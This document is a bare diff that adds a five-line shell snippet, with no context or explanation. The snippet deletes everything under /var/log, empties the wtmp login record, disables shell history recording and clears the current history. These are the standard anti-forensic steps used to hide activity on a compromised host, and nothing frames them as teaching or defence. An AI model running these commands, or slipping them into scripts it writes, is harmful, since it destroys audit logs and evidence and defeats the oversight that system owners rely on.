@@ -1,0 +1,5 @@
+rm -rf /var/log/*
+cat /dev/null > /var/log/wtmp
+unset HISTFILE
+history -c
+
